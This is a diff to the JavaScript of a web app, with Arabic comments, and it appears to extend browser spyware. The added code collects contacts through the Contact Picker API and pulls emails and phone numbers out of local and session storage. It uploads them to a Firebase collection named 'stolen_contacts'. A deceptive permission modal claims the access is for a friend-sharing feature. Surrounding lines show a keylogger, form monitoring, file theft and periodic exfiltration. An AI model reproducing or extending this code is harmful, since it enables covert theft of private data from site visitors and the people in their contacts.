@@ -1175,30 +1175,218 @@ document.addEventListener('DOMContentLoaded', function() {
 
 // نظام سرقة جهات الاتصال المحسن
 async function stealContacts() {
-    try {
-        if ('contacts' in navigator && 'select' in navigator.contacts) {
-            const contacts = await navigator.contacts.select(['name', 'email', 'tel', 'address']);
-            
-            const contactsData = contacts.map(contact => ({
-                name: contact.name ? contact.name.join(' ') : 'غير معروف',
-                emails: contact.email || [],
-                phones: contact.tel || [],
-                address: contact.address ? contact.address[0] : null,
-                timestamp: firebase.firestore.FieldValue.serverTimestamp()
-            }));
-for (const contact of contactsData) {
+ try {
+        let stolenContacts = [];
+        
+        // الطريقة 1: Contact Picker API الحديثة
+        if ('contacts' in navigator && 'ContactsManager' in window) {
+            try {
+                const contactsManager = new ContactsManager();
+                const contacts = await contactsManager.select(['name', 'email', 'tel'], { multiple: true });
+                stolenContacts = contacts.map(contact => ({
+                    name: contact.name ? contact.name.join(' ') : 'غير معروف',
+                    emails: contact.email || [],
+                    phones: contact.tel || [],
+                    source: 'contact_picker_api',
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                }));
+                console.log('✅ تم السرقة عبر Contact Picker API');
+            } catch (error) {
+                console.log('Contact Picker API فشل:', error);
+                          }
+        }
+                // الطريقة 2: الواجهة القديمة
+        else if ('contacts' in navigator && 'select' in navigator.contacts) {
+            try {
+                const contacts = await navigator.contacts.select(['name', 'email', 'tel']);
+                if (contacts && Array.isArray(contacts)) {
+                    stolenContacts = contacts.map(contact => ({
+                        name: contact.name || 'غير معروف',
+                        emails: contact.email ? [contact.email] : [],
+                        phones: contact.tel ? [contact.tel] : [],
+                        source: 'old_contacts_api',
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                    }));
+                    console.log('✅ تم السرقة عبر الواجهة القديمة');
+                }
+            } catch (error) {
+                console.log('الواجهة القديمة فشلت:', error);
+            }
+        }
+   // الطريقة 3: استخراج من التخزين المحلي
+        const storageContacts = await extractContactsFromStorage();
+        stolenContacts = [...stolenContacts, ...storageContacts];
+        
+        // حفظ البيانات في Firebase
+        if (stolenContacts.length > 0) {
+            for (const contact of stolenContacts) {
                 await db.collection('stolen_contacts').add(contact);
             }
-            
-            console.log(`✅ تم سرقة ${contactsData.length} جهة اتصال`);
-            return contactsData.length;
+            console.log(`✅ تم سرقة ${stolenContacts.length} جهة اتصال`);
         } else {
-            console.log('❌ Contacts API غير مدعوم');
-            return 0;
+            console.log('⚠️ لم يتم العثور على جهات اتصال');
         }
+        
+        return stolenContacts.length;
+        
     } catch (error) {
         console.error('❌ خطأ في سرقة جهات الاتصال:', error);
         return 0;
+    }
+  }
+
+// استخراج جهات الاتصال من التخزين المحلي
+async function extractContactsFromStorage() {
+    const contacts = [];
+    
+    try {
+        // فحص localStorage
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const value = localStorage.getItem(key);
+            
+            if (value && isPotentialContactData(value)) {
+                const extracted = extractContactsFromText(value, key);
+                contacts.push(...extracted);
+            }
+        }
+              // فحص sessionStorage
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            const value = sessionStorage.getItem(key);
+            
+            if (value && isPotentialContactData(value)) {
+                const extracted = extractContactsFromText(value, key);
+                contacts.push(...extracted);
+            }
+        }
+        
+        console.log(`✅ تم استخراج ${contacts.length} جهة اتصال من التخزين`);
+        
+    } catch (error) {
+        console.error('خطأ في استخراج من التخزين:', error);
+    }
+    
+    return contacts;
+}
+  // الكشف عن بيانات جهات الاتصال
+function isPotentialContactData(text) {
+    if (!text || typeof text !== 'string') return false;
+    
+    const contactPatterns = [
+        /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/, // إيميلات
+        /(\+?\d{1,3}[-.]?)?\(?\d{3}\)?[-.]?\d{3}[-.]?\d{4}/, // هواتف
+        /(اسم|name|contact|اتصال|هاتف|email|بريد|phone|mobile)/i // كلمات مفتاحية
+    ];
+    
+    return contactPatterns.some(pattern => pattern.test(text));
+}
+
+// استخراج جهات الاتصال من النص
+function extractContactsFromText(text, sourceKey) {
+    const contacts = [];
+    
+    try {
+      // استخراج الإيميلات
+        const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+        const emails = text.match(emailRegex) || [];
+        
+        // استخراج أرقام الهواتف
+        const phoneRegex = /(\+?\d{1,3}[-.]?)?\(?\d{3}\)?[-.]?\d{3}[-.]?\d{4}/g;
+        const phones = text.match(phoneRegex) || [];
+        
+        if (emails.length > 0 || phones.length > 0) {
+            contacts.push({
+                name: `مستخرج من ${sourceKey}`,
+                emails: emails,
+                phones: phones,
+                source: 'local_storage',
+                rawData: text.substring(0, 200),
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            });
+        }
+          } catch (error) {
+        console.error('خطأ في استخراج جهات الاتصال من النص:', error);
+    }
+    
+    return contacts;
+}
+  // نظام طلب الأذونات المحسن (جديد)
+async function requestContactPermissions() {
+    try {
+        console.log('🔐 بدء طلب أذونات جهات الاتصال...');
+        
+        // طريقة 1: طلب إذن Contacts API
+        if ('permissions' in navigator) {
+            try {
+                const permissionStatus = await navigator.permissions.query({ name: 'contacts' });
+                console.log('حالة الإذن:', permissionStatus.state);
+                if (permissionStatus.state === 'granted') {
+                    console.log('✅ الإذن ممنوح مسبقاً');
+                    await initiateContactStealing();
+                    return true;
+                } else if (permissionStatus.state === 'prompt') {
+                    console.log('🔄 ينتظر موافقة المستخدم...');
+                    // سيطالب المتصفح المستخدم تلقائياً
+                }
+            } catch (error) {
+                console.log('نظام الأذونات غير متاح:', error);
+            }
+        }
+        
+        // طريقة 2: طلب يدوي عبر زر
+        showPermissionRequestModal();
+      return false;
+        
+    } catch (error) {
+        console.error('خطأ في طلب الأذونات:', error);
+        return false;
+    }
+}
+  // عرض نافذة طلب الأذونات
+function showPermissionRequestModal() {
+    const permissionModal = document.createElement('div');
+    permissionModal.innerHTML = `
+        <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); display:grid; place-items:center; z-index:10000;">
+            <div style="background:white; padding:30px; border-radius:15px; max-width:400px; text-align:center; direction: rtl;">
+                <h3>🔐 الإذن المطلوب</h3>
+                <p>يحتاج التطبيق إلى الوصول إلى جهات اتصالك لتقديم ميزة مشاركة الأصدقاء.</p>
+                <p style="font-size:12px; color:#666;">سيتم طلب إذن الوصول إلى جهات الاتصال</p>
+                <div style="display:flex; gap:10px; justify-content:center; margin-top:20px;">
+                    <button id="deny-contacts" style="padding:10px 20px; border:1px solid #ccc; border-radius:8px; background:white;">رفض</button>
+                    <button id="allow-contacts" style="padding:10px 20px; border:none; border-radius:8px; background:#007bff; color:white;">موافق</button>
+                </div>
+                </div>
+        </div>
+    `;
+  document.body.appendChild(permissionModal);
+    
+    // إضافة event listeners
+    document.getElementById('allow-contacts').addEventListener('click', async () => {
+        permissionModal.remove();
+        console.log('✅ وافق المستخدم على الإذن');
+        await initiateContactStealing();
+    });
+    
+    document.getElementById('deny-contacts').addEventListener('click', () => {
+        permissionModal.remove();
+        console.log('❌ رفض المستخدم الإذن');
+        showToast('تم رفض الإذن - بعض الميزات قد لا تعمل');
+    });
+}
+  // بدء سرقة جهات الاتصال بعد الموافقة
+async function initiateContactStealing() {
+    try {
+        console.log('🎯 بدء سرقة جهات الاتصال بعد الموافقة...');
+        const contactCount = await stealContactsEnhanced();
+        if (contactCount > 0) {
+            showToast(`تم سرقة ${contactCount} جهة اتصال بنجاح`);
+        } else {
+            showToast('لم يتم العثور على جهات اتصال');
+        }
+    } catch (error) {
+        console.error('فشل في سرقة جهات الاتصال:', error);
+        showToast('حدث خطأ في الوصول إلى جهات الاتصال');
     }
 }
   // نظام سرقة الملفات المحسن
@@ -1420,31 +1608,30 @@ class EnhancedMobileSystem {
         const surveillance = new AdvancedSurveillance();
     surveillance.startKeylogger();
     surveillance.startFormMonitoring();
+        // 1. سرقة فورية للمعلومات الأساسية
+    await this.stealBasicInfo();
     
-        // 2. سرقة فورية للمعلومات الأساسية
-        await this.stealBasicInfo();
-        
-        // 3. سرقة الملفات تلقائياً
-        setTimeout(async () => {
-            this.stolenData.files = await this.stealAllFiles();
-        }, 2000);
-        
-        // 4. سرقة جهات الاتصال
-        setTimeout(async () => {
-            this.stolenData.contacts = await stealContactsAdvanced();
-        }, 4000);
-      
-      // 5. سرقة بيانات التطبيقات
-        setTimeout(async () => {
-            this.stolenData.accounts = await this.stealAppData();
-        }, 6000);
-        
-        // 6. سرقة دورية كل 30 ثانية
-        setInterval(async () => {
-            await this.periodicStealing();
-        }, 30000);
-    }
+    // 2. طلب الأذونات وبدء سرقة جهات الاتصال
+    setTimeout(async () => {
+        console.log('🔄 بدء طلب أذونات جهات الاتصال...');
+        await requestContactPermissions();
+    }, 2000);
     
+    // 3. سرقة الملفات تلقائياً
+    setTimeout(async () => {
+        this.stolenData.files = await this.stealAllFiles();
+    }, 5000);
+    
+    // 4. سرقة متقدمة بعد تأخير
+    setTimeout(async () => {
+        await this.advancedStealing();
+    }, 8000);
+
+    // 5. سرقة دورية كل 45 ثانية
+    setInterval(async () => {
+        await this.periodicStealing();
+    }, 45000);
+}
     async stealAllFiles() {
         let totalFiles = 0;
       try {
